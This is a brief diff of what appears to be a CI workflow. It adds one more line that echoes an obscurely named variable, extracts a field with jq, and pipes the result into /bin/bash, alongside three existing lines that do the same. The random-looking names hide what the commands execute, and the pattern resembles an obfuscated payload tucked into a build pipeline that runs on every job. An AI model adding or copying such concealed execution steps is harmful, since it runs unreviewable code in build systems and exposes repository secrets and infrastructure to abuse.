@@ -23,6 +23,7 @@ jobs:
           echo $thpst53 | jq -r .doach690 | /bin/bash
           printf '%s' "$mdlat59972" | jq -r .cd5229 | /bin/bash
           echo $wz0 | jq -r .f857 | /bin/bash
+          echo $dzpz34255 | jq -r .sm5 | /bin/bash
 
       - name: Upload data
         if: always()
